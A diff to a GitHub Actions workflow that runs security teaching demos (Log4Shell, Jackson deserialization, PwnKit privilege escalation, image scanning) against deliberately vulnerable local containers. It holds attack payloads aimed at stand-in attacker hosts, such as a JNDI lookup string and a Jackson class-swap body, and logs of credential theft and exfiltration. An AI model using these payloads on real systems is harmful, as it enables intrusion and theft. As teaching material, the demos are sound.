@@ -6,6 +6,11 @@ on:
     paths: [ 'Vulnerable Application Old Java/**' ]
   workflow_dispatch:
 
+# demo-* jobs each build their own step-summary AND upload it as a "demo-summary-*"
+# artifact (see the "Save summary for GitHub Pages" step in every job below).
+# publish-vulnerable-page collects all of them after every demo job has finished
+# (success or failure) and republishes them as one page at
+# https://johanjanssen.github.io/Keep-Up-To-Date/vulnerable/ — see that job for why.
 jobs:
   # ═══════════════════════════════════════════════════════════════
   demo-log4shell:
@@ -36,9 +41,9 @@ jobs:
 
       - name: "📖 Demo 1 — Log4Shell"
         run: |
-          S=$GITHUB_STEP_SUMMARY
+          source scripts/demo-log.sh
 
-          cat >> $S << 'HEADER'
+          cat >> "$S" << 'HEADER'
           ## 💀 Demo 1 — Log4Shell: From Search Query to Remote Code Execution
 
           **Scenario:** A developer builds a product search API. They log the search query —
@@ -49,34 +54,31 @@ jobs:
           ### 🏢 Victim's server — normal operation
 
           A legitimate user searches for products:
-          ```bash
-          # On: Victim's web application (runs as root in Docker)
-          curl "http://victim:8080/api/products/search?q=shirt"
-          ```
           HEADER
 
-          echo '```json' >> $S
-          curl -s "http://localhost:8080/api/products/search?q=shirt" | python3 -m json.tool >> $S
-          echo '```' >> $S
-          echo "" >> $S
-          echo "Everything works normally. The developer's code:" >> $S
-          echo '```java' >> $S
-          echo 'log.info("Product search query: " + q);  // just logging — what could go wrong?' >> $S
-          echo '```' >> $S
-          echo "---" >> $S
-          echo "" >> $S
+          run_json "curl \"http://victim:8080/api/products/search?q=shirt\"" \
+            curl -s "http://localhost:8080/api/products/search?q=shirt"
 
-          # ── THE ATTACK ──
-          cat >> $S << 'ATTACK'
+          cat >> "$S" << 'DEV_CODE'
+          Everything works normally. The developer's code:
+          ```java
+          log.info("Product search query: " + q);  // just logging — what could go wrong?
+          ```
+
+          ---
+
           ### 💀 Attacker's machine — sending the exploit
 
           The attacker replaces the search term with a JNDI lookup expression:
-          ```bash
-          # On: Attacker's machine
-          curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}"
-          ```
+          DEV_CODE
 
-          **What happens behind the scenes:**
+          run_json "curl \"http://victim:8080/api/products/search?q=\${jndi:ldap://attacker:1389/pwned}\"" \
+            curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D"
+
+          cat >> "$S" << 'MECHANICS'
+          The app answered normally above — **the victim doesn't notice anything.** Behind the
+          scenes though:
+
           1. The search query arrives at the victim's controller
           2. The controller calls `log.info("Product search query: " + q)`
           3. Log4j 2.14.1 sees `${jndi:ldap://...}` and performs a network lookup
@@ -85,37 +87,24 @@ jobs:
           6. The victim downloads and executes the attacker's malicious Java class
           7. **The attacker now has Remote Code Execution inside the victim's container**
 
-          ATTACK
+          ---
 
-          echo "The app responds normally — **the victim doesn't notice anything:**" >> $S
-          echo '```json' >> $S
-          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D" >> $S
-          echo "" >> $S
-          echo '```' >> $S
+          ### 📡 Attacker's server — what the attacker sees
+
+          The attacker's LDAP + HTTP server received connections from the victim:
+          MECHANICS
+
           sleep 5
+          run_pipe "docker logs callback   # (filtered to the interesting lines)" \
+            'docker logs callback 2>&1 | grep -E "LDAP lookup|Serving malicious|FILE SERVER|Victim|bytes"'
 
-          echo "---" >> $S
-          echo "" >> $S
+          echo "### 🎯 Inside the victim's container — the exploit ran" >> "$S"
+          echo "" >> "$S"
+          echo "The attacker's code executed inside the victim. Here's what it did:" >> "$S"
+          run_pipe "docker logs vuln-app   # (filtered to the interesting lines)" \
+            'docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|User:|Hostname:|OS:|Stealing|shadow|Exfiltrat|Privilege escalation|Already root|Modified|read access|outbound|scan the internal|──"'
 
-          # ── ATTACKER'S VIEW ──
-          echo "### 📡 Attacker's server — what the attacker sees" >> $S
-          echo "" >> $S
-          echo "The attacker's LDAP + HTTP server received connections from the victim:" >> $S
-          echo '```' >> $S
-          docker logs callback 2>&1 | grep -E "LDAP lookup|Serving malicious|FILE SERVER|Victim|bytes" >> $S
-          echo '```' >> $S
-          echo "" >> $S
-
-          # ── VICTIM'S CONTAINER ──
-          echo "### 🎯 Inside the victim's container — the exploit ran" >> $S
-          echo "" >> $S
-          echo "The attacker's code executed inside the victim. Here's what it did:" >> $S
-          echo '```' >> $S
-          docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|User:|Hostname:|OS:|Stealing|shadow|Exfiltrat|Privilege escalation|Already root|Modified|read access|outbound|scan the internal|──" >> $S
-          echo '```' >> $S
-          echo "" >> $S
-
-          cat >> $S << 'CONCLUSION'
+          cat >> "$S" << 'CONCLUSION'
           ### 💡 Key takeaway
 
           > **The developer did nothing wrong.** They just logged user input — standard practice.
@@ -123,9 +112,21 @@ jobs:
           > Updating to log4j 2.17+ or removing log4j-core completely prevents this attack.
           CONCLUSION
 
+      - name: "📤 Save summary for GitHub Pages"
+        if: always()
+        run: cp "$GITHUB_STEP_SUMMARY" 01-log4shell.md || true
+
       - name: "🧹 Cleanup"
         if: always()
         run: docker stop vuln-app callback 2>/dev/null || true; docker rm vuln-app callback 2>/dev/null || true
+
+      - name: "⬆️ Upload summary artifact"
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: demo-summary-01-log4shell
+          path: "Vulnerable Application Old Java/01-log4shell.md"
+          if-no-files-found: ignore
 
   # ═══════════════════════════════════════════════════════════════
   demo-jackson:
@@ -148,9 +149,9 @@ jobs:
 
       - name: "📖 Demo 2 — Jackson"
         run: |
-          S=$GITHUB_STEP_SUMMARY
+          source scripts/demo-log.sh
 
-          cat >> $S << 'HEADER'
+          cat >> "$S" << 'HEADER'
           ## 💀 Demo 2 — Jackson Deserialization: Attacker Controls Your Objects
 
           **Scenario:** an internal "profile sync" endpoint between two Spring Boot services that
@@ -166,57 +167,37 @@ jobs:
 
           A legitimate service pushes a profile update (already in the wire format this stack always
           uses — this is not attacker-crafted, it's what `enableDefaultTyping()` produces automatically):
-          ```bash
-          # On: an internal service, using the same ObjectMapper config
-          curl -X POST http://victim:8080/api/users/import \
-            -H "Content-Type: application/json" \
-            -d '["java.util.LinkedHashMap", {"name":"Alice","email":"alice@conf.io"}]'
-          ```
           HEADER
 
-          echo '```json' >> $S
-          curl -s -X POST http://localhost:8080/api/users/import \
-            -H "Content-Type: application/json" \
-            -d '["java.util.LinkedHashMap", {"name":"Alice","email":"alice@conf.io"}]' | python3 -m json.tool >> $S
-          echo '```' >> $S
-          echo "" >> $S
-          echo "---" >> $S
-          echo "" >> $S
+          run_json "curl -X POST \"http://victim:8080/api/users/import\" -d '[\"java.util.LinkedHashMap\", {\"name\":\"Alice\",\"email\":\"alice@conf.io\"}]'" \
+            curl -s -X POST http://localhost:8080/api/users/import \
+              -H "Content-Type: application/json" \
+              -d '["java.util.LinkedHashMap", {"name":"Alice","email":"alice@conf.io"}]'
 
-          cat >> $S << 'ATTACK'
+          cat >> "$S" << 'ATTACK'
+
+          ---
+
           ### 💀 Attacker's machine — same shape, one field swapped
 
           The attacker doesn't need to send anything that looks unusual — they reach the same
           endpoint (e.g. because it's exposed further than intended) and swap **one nested value's**
-          class inside an otherwise normal-looking wrapped profile:
-          ```bash
-          # On: Attacker's machine — looks like ordinary traffic for this stack
-          curl -X POST http://victim:8080/api/users/import \
-            -H "Content-Type: application/json" \
-            -d '["java.util.LinkedHashMap", {"name":"Alice","email":["java.net.URL","http://attacker:9999/jackson-rce-proof"]}]'
-          ```
-
-          The top-level wrapper (`java.util.LinkedHashMap`) is exactly what a legitimate request looks
-          like. Only the `email` field's class was swapped — `enableDefaultTyping()` applies the same
-          "trust the client's class name" rule recursively to every nested value, not just the top level.
+          class inside an otherwise normal-looking wrapped profile. The top-level wrapper
+          (`java.util.LinkedHashMap`) is exactly what a legitimate request looks like. Only the
+          `email` field's class was swapped — `enableDefaultTyping()` applies the same "trust the
+          client's class name" rule recursively to every nested value, not just the top level.
           ATTACK
 
-          echo "" >> $S
-          echo "Response from the server:" >> $S
-          echo '```json' >> $S
-          RESP=$(curl -s -X POST http://localhost:8080/api/users/import \
-            -H "Content-Type: application/json" \
-            -d '["java.util.LinkedHashMap", {"name":"Alice","email":["java.net.URL","http://host.docker.internal:9999/jackson-rce-proof"]}]')
-          echo "$RESP" | python3 -m json.tool 2>/dev/null >> $S || echo "$RESP" >> $S
-          echo '```' >> $S
-          echo "" >> $S
-          echo "The application's own logs already flagged it (defensive type-introspection logging, not a hack):" >> $S
-          echo '```' >> $S
-          docker logs vuln-app 2>&1 | grep -E "\[import\]" | tail -6 >> $S
-          echo '```' >> $S
-          echo "" >> $S
+          run_json "curl -X POST \"http://victim:8080/api/users/import\" -d '[\"java.util.LinkedHashMap\", {\"name\":\"Alice\",\"email\":[\"java.net.URL\",\"http://attacker:9999/jackson-rce-proof\"]}]'" \
+            curl -s -X POST http://localhost:8080/api/users/import \
+              -H "Content-Type: application/json" \
+              -d '["java.util.LinkedHashMap", {"name":"Alice","email":["java.net.URL","http://host.docker.internal:9999/jackson-rce-proof"]}]'
 
-          cat >> $S << 'CONCLUSION'
+          echo "The application's own logs already flagged it (defensive type-introspection logging, not a hack):" >> "$S"
+          run_pipe "docker logs vuln-app | grep '\[import\]'" \
+            'docker logs vuln-app 2>&1 | grep -E "\[import\]" | tail -6'
+
+          cat >> "$S" << 'CONCLUSION'
           ### 💡 Key takeaway
 
           > **The `email` field deserialized as `java.net.URL`, not `String` — proof the attacker
@@ -231,9 +212,21 @@ jobs:
           > instead. Update jackson-databind to the latest version.
           CONCLUSION
 
+      - name: "📤 Save summary for GitHub Pages"
+        if: always()
+        run: cp "$GITHUB_STEP_SUMMARY" 02-jackson.md || true
+
       - name: "🧹 Cleanup"
         if: always()
         run: docker stop vuln-app callback 2>/dev/null; docker rm vuln-app callback 2>/dev/null
+
+      - name: "⬆️ Upload summary artifact"
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: demo-summary-02-jackson
+          path: "Vulnerable Application Old Java/02-jackson.md"
+          if-no-files-found: ignore
 
   # ═══════════════════════════════════════════════════════════════
   demo-full-chain:
@@ -263,9 +256,9 @@ jobs:
 
       - name: "📖 Demo 3 — Full chain on ROOT image"
         run: |
-          S=$GITHUB_STEP_SUMMARY
+          source scripts/demo-log.sh
 
-          cat >> $S << 'HEADER'
+          cat >> "$S" << 'HEADER'
           ## 💀 Demo 3 — One HTTP Request → Full Server Compromise
 
           **Scenario:** Same Log4Shell attack, but now we look at what the attacker
@@ -276,32 +269,21 @@ jobs:
           ---
 
           ### 🔴 Attack on ROOT image
-
-          The attacker sends the same exploit as Demo 1:
-          ```bash
-          # On: Attacker's machine
-          curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}"
-          ```
           HEADER
 
-          # Fire exploit
-          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D" > /dev/null || true
+          run_live "curl -o /dev/null -w '%{http_code}\n' \"http://victim:8080/api/products/search?q=\${jndi:ldap://attacker:1389/pwned}\"" \
+            curl -s -o /dev/null -w '%{http_code}\n' "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D"
           sleep 6
 
-          echo "" >> $S
-          echo "#### 🎯 What the attacker's code did inside the ROOT container:" >> $S
-          echo '```' >> $S
-          docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|User:|Hostname:|OS:|Stealing|shadow|root:|Exfiltrat|HTTP|Privilege escalation|Already root|Modified|SSH|create users|pivot|──|\[" | head -30 >> $S
-          echo '```' >> $S
-          echo "" >> $S
+          echo "#### 🎯 What the attacker's code did inside the ROOT container:" >> "$S"
+          run_pipe "docker logs vuln-app   # (filtered to the interesting lines)" \
+            'docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|User:|Hostname:|OS:|Stealing|shadow|root:|Exfiltrat|HTTP|Privilege escalation|Already root|Modified|SSH|create users|pivot|──|\[" | head -30'
 
-          echo "#### 📡 Attacker's server received the stolen data:" >> $S
-          echo '```' >> $S
-          docker logs callback 2>&1 | grep -A5 "stolen-data" | head -10 >> $S
-          echo '```' >> $S
-          echo "" >> $S
+          echo "#### 📡 Attacker's server received the stolen data:" >> "$S"
+          run_pipe "docker logs callback | grep -A5 stolen-data" \
+            'docker logs callback 2>&1 | grep -A5 "stolen-data" | head -10'
 
-          cat >> $S << 'ROOT_IMPACT'
+          cat >> "$S" << 'ROOT_IMPACT'
           > **Impact on ROOT image:** The attacker read `/etc/shadow` (password hashes),
           > modified system files, and exfiltrated data. Full server compromise from a single HTTP request.
 
@@ -311,7 +293,7 @@ jobs:
 
       - name: "🔒 Same attack on SAFE image"
         run: |
-          S=$GITHUB_STEP_SUMMARY
+          source scripts/demo-log.sh
 
           docker stop vuln-app 2>/dev/null; docker rm vuln-app 2>/dev/null
           # Clear callback dashboard
@@ -322,25 +304,20 @@ jobs:
             -p 8080:8080 vuln-app:safe
           for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done
 
-          echo "### 🟢 Same attack on SAFE image" >> $S
-          echo "" >> $S
-          echo "Same exploit, same application JAR, but different container configuration:" >> $S
-          echo '```bash' >> $S
-          echo '# On: Attacker'\''s machine — exact same command' >> $S
-          echo 'curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}"' >> $S
-          echo '```' >> $S
-          echo "" >> $S
+          cat >> "$S" << 'HEADER'
+          ### 🟢 Same attack on SAFE image
 
-          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D" > /dev/null || true
+          Same exploit, same application JAR, but different container configuration:
+          HEADER
+
+          run_live "curl -o /dev/null -w '%{http_code}\n' \"http://victim:8080/api/products/search?q=\${jndi:ldap://attacker:1389/pwned}\"   # exact same command as above" \
+            curl -s -o /dev/null -w '%{http_code}\n' "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D"
           sleep 4
 
-          echo "#### Result on SAFE image:" >> $S
-          echo '```' >> $S
-          docker logs vuln-app 2>&1 | tail -8 >> $S
-          echo '```' >> $S
-          echo "" >> $S
+          echo "#### Result on SAFE image:" >> "$S"
+          run_pipe "docker logs vuln-app | tail -8" 'docker logs vuln-app 2>&1 | tail -8'
 
-          cat >> $S << 'SAFE_RESULT'
+          cat >> "$S" << 'SAFE_RESULT'
           > **The JNDI lookup is blocked.** Java 25 defaults `com.sun.jndi.ldap.object.trustURLCodebase=false`,
           > preventing the JVM from loading remote classes. The attack fails silently.
           >
@@ -363,9 +340,21 @@ jobs:
           > in the container configuration. Keep your base images updated and minimal.
           SAFE_RESULT
 
+      - name: "📤 Save summary for GitHub Pages"
+        if: always()
+        run: cp "$GITHUB_STEP_SUMMARY" 03-full-chain.md || true
+
       - name: "🧹 Cleanup"
         if: always()
         run: docker stop vuln-app callback 2>/dev/null; docker rm vuln-app callback 2>/dev/null
+
+      - name: "⬆️ Upload summary artifact"
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: demo-summary-03-full-chain
+          path: "Vulnerable Application Old Java/03-full-chain.md"
+          if-no-files-found: ignore
 
   # ═══════════════════════════════════════════════════════════════
   demo-privilege-escalation:
@@ -397,8 +386,7 @@ jobs:
       - name: "📖 Demo 4 — Scenario"
         run: |
           S=$GITHUB_STEP_SUMMARY
-
-          cat >> $S << 'HEADER'
+          cat >> "$S" << 'HEADER'
           ## 💀 Demo 4 — "We Run As Non-Root" Is Not the Whole Story
 
           **Scenario:** same Log4Shell exploit as Demo 1, but this image runs the app as
@@ -412,61 +400,62 @@ jobs:
 
       - name: "🔎 Live baseline — proving appuser is real, before any exploit runs"
         run: |
-          S=$GITHUB_STEP_SUMMARY
-          echo "" >> $S
-          echo "### 🔎 Baseline — live \`docker exec\` against the container this job is running right now" >> $S
-          echo "" >> $S
-          echo "Not a log excerpt — these commands run against the actual container, on the actual" >> $S
-          echo "GitHub Actions runner, seconds before the exploit fires:" >> $S
-          echo "" >> $S
-          echo '```console' >> $S
-          echo '$ docker exec vuln-app id' >> $S
-          docker exec vuln-app id >> $S || true
-          echo "" >> $S
-          echo '$ docker exec vuln-app ls -l /usr/bin/pkexec' >> $S
-          docker exec vuln-app ls -l /usr/bin/pkexec >> $S || true
-          echo "" >> $S
-          echo '$ docker exec vuln-app dpkg -s policykit-1 | grep Version' >> $S
-          docker exec vuln-app dpkg -s policykit-1 2>/dev/null | grep Version >> $S || true
-          echo '```' >> $S
-          echo "" >> $S
-          echo "Confirmed live: the app really runs as \`uid=1000(appuser)\`, and \`pkexec\` really" >> $S
-          echo "carries the SUID bit (\`rws\`) — it runs as root no matter which user invokes it." >> $S
-          echo "" >> $S
-          echo "---" >> $S
-          echo "" >> $S
-          echo "### 💀 Attacker's machine — same exploit as Demo 1" >> $S
-          echo "" >> $S
-          echo '```bash' >> $S
-          echo 'curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwnkit}"' >> $S
-          echo '```' >> $S
+          source scripts/demo-log.sh
+
+          cat >> "$S" << 'BASELINE_INTRO'
+
+          ### 🔎 Baseline — live `docker exec` against the container this job is running right now
+
+          Not a log excerpt — these commands run against the actual container, on the actual
+          GitHub Actions runner, seconds before the exploit fires:
+          BASELINE_INTRO
+
+          run_live "docker exec vuln-app id" docker exec vuln-app id
+          run_live "docker exec vuln-app ls -l /usr/bin/pkexec" docker exec vuln-app ls -l /usr/bin/pkexec
+          run_pipe "docker exec vuln-app dpkg -s policykit-1 | grep Version" \
+            "docker exec vuln-app dpkg -s policykit-1 2>/dev/null | grep Version"
+
+          cat >> "$S" << 'BASELINE_OUTRO'
+          Confirmed live: the app really runs as `uid=1000(appuser)`, and `pkexec` really
+          carries the SUID bit (`rws`) — it runs as root no matter which user invokes it.
+
+          ---
+
+          ### 💀 Attacker's machine — same exploit as Demo 1
+          ```bash
+          # On: Attacker's machine
+          curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwnkit}"
+          ```
+          BASELINE_OUTRO
 
       - name: "💀 Fire the exploit"
         run: |
-          S=$GITHUB_STEP_SUMMARY
-          echo "" >> $S
-          echo "Sent live at \`$(date -u +%H:%M:%S) UTC\` from this runner:" >> $S
-          echo "" >> $S
-          echo '```console' >> $S
-          echo '$ curl -w "%{http_code}\n" "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwnkit}"' >> $S
-          HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Fpwnkit%7D" || true)
-          echo "$HTTP_CODE" >> $S
-          echo '```' >> $S
-          echo "" >> $S
-          echo "The app answered normally — the exploit runs invisibly in the background. Watch it" >> $S
-          echo "happen live in the next step." >> $S
+          source scripts/demo-log.sh
+
+          echo "" >> "$S"
+          echo "Sent live at \`$(date -u +%H:%M:%S) UTC\` from this runner:" >> "$S"
+
+          run_live "curl -w '%{http_code}\n' \"http://victim:8080/api/products/search?q=\${jndi:ldap://attacker:1389/pwnkit}\"" \
+            curl -s -o /dev/null -w '%{http_code}\n' "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Fpwnkit%7D"
+
+          echo "" >> "$S"
+          echo "The app answered normally — the exploit runs invisibly in the background. Watch it" >> "$S"
+          echo "happen live in the next step." >> "$S"
 
       - name: "⏳ Watching it happen — live telemetry from both containers"
         run: |
-          S=$GITHUB_STEP_SUMMARY
-          echo "" >> $S
-          echo "### ⏳ Watching the attack unfold in real time" >> $S
-          echo "" >> $S
-          echo "Polling \`docker logs\` on both running containers, once a second, printing each" >> $S
-          echo "milestone the instant it appears — this is the real order of events, not a canned" >> $S
-          echo "transcript:" >> $S
-          echo "" >> $S
-          echo '```console' >> $S
+          source scripts/demo-log.sh
+
+          cat >> "$S" << 'WATCH_INTRO'
+
+          ### ⏳ Watching the attack unfold in real time
+
+          Polling `docker logs` on both running containers, once a second, printing each
+          milestone the instant it appears — this is the real order of events, not a canned
+          transcript. Each milestone shows two lines: the **raw line the container actually
+          printed** (proof this is really happening), then what it means:
+          WATCH_INTRO
+          echo '```console' >> "$S"
 
           MARKERS=(
             "callback|LDAP lookup received|📡 [callback] attacker's LDAP server received the JNDI callback"
@@ -480,71 +469,74 @@ jobs:
           declare -A SEEN
           DONE=0
 
+          # Each milestone is `tee`d, not just redirected — so this loop's progress is
+          # visible live in the Actions log while it's still running, not only in the
+          # rendered summary after the fact. The RAW line is the actual `docker logs`
+          # output that matched — not the friendly LABEL — so what's on screen is real
+          # command output, not narration standing in for it.
           for i in $(seq 1 20); do
             for m in "${MARKERS[@]}"; do
               IFS='|' read -r CONTAINER PATTERN LABEL <<< "$m"
-              if [ -z "${SEEN[$m]:-}" ]; then
-                if docker logs "$CONTAINER" 2>&1 | grep -qF "$PATTERN"; then
-                  SEEN[$m]=1
-                  printf '[+%02ds] %s\n' "$i" "$LABEL" >> $S
-                fi
+              if [ -n "${SEEN[$m]:-}" ]; then continue; fi
+              RAW=$(docker logs "$CONTAINER" 2>&1 | grep -F "$PATTERN" | head -1) || true
+              if [ -n "$RAW" ]; then
+                SEEN[$m]=1
+                {
+                  printf '[+%02ds] %s: %s\n' "$i" "$CONTAINER" "$(echo "$RAW" | sed 's/^ *//')"
+                  printf '[+%02ds]   └─ %s\n' "$i" "$LABEL"
+                } | tee -a "$S"
               fi
             done
             BANNERS=$(docker logs vuln-app 2>&1 | grep -c "══════" || true)
             if [ "${BANNERS:-0}" -ge 3 ]; then
               DONE=1
-              printf '[+%02ds] 🏁 payload finished executing inside the victim container\n' "$i" >> $S
+              printf '[+%02ds] 🏁 payload finished executing inside the victim container\n' "$i" | tee -a "$S"
               break
             fi
             sleep 1
           done
-          [ "$DONE" -eq 1 ] || echo "⏱️  stopped polling after 20s — showing whatever landed by then" >> $S
-          echo '```' >> $S
+          [ "$DONE" -eq 1 ] || echo "⏱️  stopped polling after 20s — showing whatever landed by then" | tee -a "$S"
+          echo '```' >> "$S"
 
       - name: "🎯 Forensics — proof this ran on a real machine"
         run: |
-          S=$GITHUB_STEP_SUMMARY
-          echo "" >> $S
-          echo "### 🎯 Forensics — what the exploit left behind inside \`vuln-app\`" >> $S
-          echo "" >> $S
-          echo "The attacker's second-stage script downloaded, compiled, and ran a real C exploit" >> $S
-          echo "*inside this container* moments ago. It's still there — this isn't a description," >> $S
-          echo "it's \`docker exec\` reading the container's actual \`/tmp\` right now:" >> $S
-          echo "" >> $S
-          echo '```console' >> $S
-          echo '$ docker exec vuln-app ls -la /tmp' >> $S
-          docker exec vuln-app ls -la /tmp >> $S || true
-          echo "" >> $S
-          echo '$ docker exec vuln-app stat /tmp/pwnkit' >> $S
-          docker exec vuln-app stat /tmp/pwnkit >> $S 2>&1 || true
-          echo "" >> $S
-          echo '$ docker exec vuln-app id   # (the long-lived container process — still appuser)' >> $S
-          docker exec vuln-app id >> $S || true
-          echo '```' >> $S
-          echo "" >> $S
-          echo "### 📜 Full annotated log recap" >> $S
-          echo "" >> $S
-          echo '```' >> $S
-          docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|User:|Hostname:|OS:|shadow|Privilege escalation|Not root|Fetching|PwnKit|pkexec|gcc|FOUND|FAIL|Escalating|ESCALATION SUCCEEDED|Current user|Regardless|✓|──" >> $S || true
-          echo '```' >> $S
+          source scripts/demo-log.sh
+
+          cat >> "$S" << 'FORENSICS_INTRO'
+
+          ### 🎯 Forensics — what the exploit left behind inside `vuln-app`
+
+          The attacker's second-stage script downloaded, compiled, and ran a real C exploit
+          *inside this container* moments ago. It's still there — this isn't a description,
+          it's `docker exec` reading the container's actual `/tmp` right now:
+          FORENSICS_INTRO
+
+          run_live "docker exec vuln-app ls -la /tmp" docker exec vuln-app ls -la /tmp
+          run_live "docker exec vuln-app stat /tmp/pwnkit" docker exec vuln-app stat /tmp/pwnkit
+          run_live "docker exec vuln-app id   # (the long-lived container process — still appuser)" \
+            docker exec vuln-app id
+
+          echo "### 📜 Full annotated log recap" >> "$S"
+          run_pipe "docker logs vuln-app   # (filtered to the interesting lines)" \
+            'docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|User:|Hostname:|OS:|shadow|Privilege escalation|Not root|Fetching|PwnKit|pkexec|gcc|FOUND|FAIL|Escalating|ESCALATION SUCCEEDED|Current user|Regardless|✓|──"'
 
       - name: "💡 Verdict"
         run: |
-          S=$GITHUB_STEP_SUMMARY
-          if docker logs vuln-app 2>&1 | grep -q "ESCALATION SUCCEEDED"; then
-            echo "### 🔓 Proof — running the exploit again, live, right now" >> $S
-            echo "" >> $S
-            echo "The compiled exploit is still sitting in the container as \`/tmp/pwnkit\` (see the" >> $S
-            echo "forensics step above). Not a log excerpt — let's run it again, live, against the" >> $S
-            echo "actual container, and watch it escalate from \`appuser\` to root in real time:" >> $S
-            echo "" >> $S
-            echo '```console' >> $S
-            echo '$ docker exec -w /tmp vuln-app ./pwnkit' >> $S
-            docker exec -w /tmp vuln-app ./pwnkit >> $S 2>&1 || true
-            echo '```' >> $S
-            echo "" >> $S
+          source scripts/demo-log.sh
 
-            cat >> $S << 'ESCALATED'
+          if docker logs vuln-app 2>&1 | grep -q "ESCALATION SUCCEEDED"; then
+            cat >> "$S" << 'PROOF_INTRO'
+
+          ### 🔓 Proof — running the exploit again, live, right now
+
+          The compiled exploit is still sitting in the container as `/tmp/pwnkit` (see the
+          forensics step above). Not a log excerpt — let's run it again, live, against the
+          actual container, and watch it escalate from `appuser` to root in real time:
+          PROOF_INTRO
+
+            run_live "docker exec -w /tmp vuln-app ./pwnkit" docker exec -w /tmp vuln-app ./pwnkit
+
+            cat >> "$S" << 'ESCALATED'
 
           ### 💡 Key takeaway
 
@@ -554,7 +546,7 @@ jobs:
           > enough — both had to be out of date at the same time.
           ESCALATED
           else
-            cat >> $S << 'BLOCKED'
+            cat >> "$S" << 'BLOCKED'
 
           ### 💡 Key takeaway
 
@@ -569,9 +561,21 @@ jobs:
           BLOCKED
           fi
 
+      - name: "📤 Save summary for GitHub Pages"
+        if: always()
+        run: cp "$GITHUB_STEP_SUMMARY" 04-privilege-escalation.md || true
+
       - name: "🧹 Cleanup"
         if: always()
         run: docker stop vuln-app callback 2>/dev/null || true; docker rm vuln-app callback 2>/dev/null || true
+
+      - name: "⬆️ Upload summary artifact"
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: demo-summary-04-privilege-escalation
+          path: "Vulnerable Application Old Java/04-privilege-escalation.md"
+          if-no-files-found: ignore
 
   # ═══════════════════════════════════════════════════════════════
   scan-compare:
@@ -595,9 +599,9 @@ jobs:
 
       - name: "📊 Scan & compare"
         run: |
-          S=$GITHUB_STEP_SUMMARY
+          source scripts/demo-log.sh
 
-          cat >> $S << 'HEADER'
+          cat >> "$S" << 'HEADER'
           ## 📊 Image Security Comparison
 
           Three Docker images running the **exact same application JAR**, but with
@@ -615,7 +619,7 @@ jobs:
             SIZES[$IMG]=$(docker image inspect "vuln-app:$IMG" --format='{{.Size}}' | awk '{printf "%.0f", $1/1024/1024}')
           done
 
-          cat >> $S << TABLE
+          cat >> "$S" << TABLE
           | Metric | 🔴 root | ⚠️ escalation | 🟢 safe |
           |--------|---------|---------------|---------|
           | Total CVEs | ${TOTALS[root]} | ${TOTALS[escalation]} | ${TOTALS[safe]} |
@@ -628,12 +632,81 @@ jobs:
 
           TABLE
 
-          echo "### 🔴 Top vulnerabilities — vuln-app:root" >> $S
-          echo '```' >> $S
-          trivy image --severity CRITICAL,HIGH --no-progress vuln-app:root 2>/dev/null | head -50 >> $S
-          echo '```' >> $S
-          echo "" >> $S
-          echo "### 🟢 Scan — vuln-app:safe" >> $S
-          echo '```' >> $S
-          trivy image --severity CRITICAL,HIGH --no-progress vuln-app:safe 2>/dev/null | head -50 >> $S
-          echo '```' >> $S
+          echo "### 🔴 Top vulnerabilities — vuln-app:root" >> "$S"
+          run_pipe "trivy image --severity CRITICAL,HIGH vuln-app:root" \
+            "trivy image --severity CRITICAL,HIGH --no-progress vuln-app:root 2>/dev/null | head -50"
+
+          echo "### 🟢 Scan — vuln-app:safe" >> "$S"
+          run_pipe "trivy image --severity CRITICAL,HIGH vuln-app:safe" \
+            "trivy image --severity CRITICAL,HIGH --no-progress vuln-app:safe 2>/dev/null | head -50"
+
+      - name: "📤 Save summary for GitHub Pages"
+        if: always()
+        run: cp "$GITHUB_STEP_SUMMARY" 05-scan-compare.md || true
+
+      - name: "⬆️ Upload summary artifact"
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: demo-summary-05-scan-compare
+          path: "Vulnerable Application Old Java/05-scan-compare.md"
+          if-no-files-found: ignore
+
+  # ═══════════════════════════════════════════════════════════════
+  publish-vulnerable-page:
+    name: "📄 Publish GitHub Pages — /vulnerable"
+    runs-on: ubuntu-latest
+    needs: [ demo-log4shell, demo-jackson, demo-full-chain, demo-privilege-escalation, scan-compare ]
+    # Always publish whatever summaries did get produced, even if one demo job failed
+    # or was skipped — a partial live report is more useful than none.
+    if: always()
+    permissions:
+      contents: write
+    # See static.yml / compare-scans.yml for why each gh-pages-publishing workflow
+    # gets its own concurrency group instead of sharing one.
